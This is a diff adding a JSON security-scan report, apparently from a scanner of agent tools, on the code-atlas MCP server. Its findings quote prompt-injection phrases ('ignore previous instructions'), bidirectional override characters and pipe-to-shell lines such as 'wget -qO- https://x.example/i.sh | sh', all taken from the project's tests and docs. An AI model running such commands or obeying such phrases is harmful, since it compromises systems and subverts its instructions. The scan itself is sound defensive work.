@@ -1,0 +1,140 @@
+{
+  "item": {
+    "source": "github:mcp-server",
+    "ecosystem": "GitHub",
+    "name": "cuongdinhngo/code-atlas",
+    "version": "b77d81f78ef8a007469ec9cc369f95910712249a",
+    "download": "https://codeload.github.com/cuongdinhngo/code-atlas/tar.gz/b77d81f78ef8a007469ec9cc369f95910712249a"
+  },
+  "archive_sha256": "a39d33365f62ee8293bd626c52fdea0ac004ec8a3a92911f564f31d5ef94ca5d",
+  "findings": [
+    {
+      "severity": "medium",
+      "id": "AGT-R-0002",
+      "summary": "Bidirectional override characters can make text display differently from what the model reads",
+      "path": "code-atlas-b77d81f78ef8a007469ec9cc369f95910712249a/tests/test_untrusted_output.py",
+      "line": 43,
+      "evidence": "\\u{202e}",
+      "file_sha256": "8810ba3577dd4473ecd8384f9ed4fb998571720eb2b52b6c33dff574872eada7"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "code-atlas-b77d81f78ef8a007469ec9cc369f95910712249a/tests/test_untrusted_output.py",
+      "line": 44,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "8810ba3577dd4473ecd8384f9ed4fb998571720eb2b52b6c33dff574872eada7"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "code-atlas-b77d81f78ef8a007469ec9cc369f95910712249a/tests/test_onboarding_llm.py",
+      "line": 200,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "f296690f956a7477d206c922c1f63b983a3e3aed0e6a709918bfc51148362520"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0002",
+      "summary": "Bidirectional override characters can make text display differently from what the model reads",
+      "path": "code-atlas-b77d81f78ef8a007469ec9cc369f95910712249a/tests/test_index_text_injection.py",
+      "line": 43,
+      "evidence": "\\u{202a}",
+      "file_sha256": "8e5e7e9c7b291de00c1499e373231d59ba06cf859e99d45082f75170ab4d7641"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "code-atlas-b77d81f78ef8a007469ec9cc369f95910712249a/tests/test_index_text_injection.py",
+      "line": 89,
+      "evidence": "ignore previous rules",
+      "file_sha256": "8e5e7e9c7b291de00c1499e373231d59ba06cf859e99d45082f75170ab4d7641"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "code-atlas-b77d81f78ef8a007469ec9cc369f95910712249a/tests/test_index_text_injection.py",
+      "line": 136,
+      "evidence": "curl x | sh",
+      "file_sha256": "8e5e7e9c7b291de00c1499e373231d59ba06cf859e99d45082f75170ab4d7641"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "code-atlas-b77d81f78ef8a007469ec9cc369f95910712249a/tests/test_container_hardening.py",
+      "line": 366,
+      "evidence": "wget -qO- https://x.example/i.sh | sh",
+      "file_sha256": "df74e59851b424445797701aafd86026687886c5962bc72c8e04d2a5b62d870a"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-T-0002",
+      "summary": "Reads SSH keys, cloud credentials, keychains or browser profiles",
+      "path": "code-atlas-b77d81f78ef8a007469ec9cc369f95910712249a/tests/test_container_hardening.py",
+      "line": 271,
+      "evidence": "(REPO / \".dockerignore\").read_text(encoding=\"utf-8\")",
+      "file_sha256": "df74e59851b424445797701aafd86026687886c5962bc72c8e04d2a5b62d870a"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "code-atlas-b77d81f78ef8a007469ec9cc369f95910712249a/docs/tasks/429_untrusted-output-framing.md",
+      "line": 15,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "29a2fe5bde255ec267573320e3dd5cf743ebd660f85f625a995bc000d57ffaf0"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "code-atlas-b77d81f78ef8a007469ec9cc369f95910712249a/docs/tasks/421_index-text-injection.md",
+      "line": 45,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "c9e4e62d1a6194cb75a3f7be1432c1d8c6791eb4f81eac89da0f22ef72859b69"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "code-atlas-b77d81f78ef8a007469ec9cc369f95910712249a/docs/LESSONS.md",
+      "line": 131,
+      "evidence": "ignore previous rules",
+      "file_sha256": "42119c62bba1285c921d926f3112688af2c0a6a2908089f0071738a648d85133"
+    }
+  ],
+  "flags": [],
+  "domains": [
+    "api.github.com",
+    "claude.ai",
+    "code.claude.com",
+    "cyclonedx.org",
+    "developers.openai.com",
+    "docs.astral.sh",
+    "evil.example",
+    "example.com",
+    "example.invalid",
+    "files.pythonhosted.org",
+    "fonts.googleapis.com",
+    "fonts.gstatic.com",
+    "getcomposer.org",
+    "github.com",
+    "opencode.ai",
+    "packagist.org",
+    "phpstan.org",
+    "pypi.org",
+    "raw.githubusercontent.com",
+    "registry.npmjs.org",
+    "tracker.example",
+    "www.npmjs.com",
+    "www.w3.org",
+    "x.example"
+  ],
+  "install_script": false,
+  "score": "high"
+}
